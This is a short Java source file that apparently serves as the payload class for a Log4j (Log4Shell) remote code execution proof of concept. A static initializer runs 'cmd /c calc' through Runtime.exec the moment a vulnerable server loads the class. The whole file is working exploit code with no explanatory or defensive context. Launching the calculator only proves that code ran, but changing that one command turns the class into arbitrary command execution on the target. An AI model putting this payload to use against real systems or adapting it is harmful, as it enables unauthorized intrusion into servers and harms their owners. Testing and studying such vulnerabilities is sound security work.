import java.io.IOException;
public class Log4jRCE {
	static{
		try {
			java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	public static void main(String[] args) {
		
	}
}
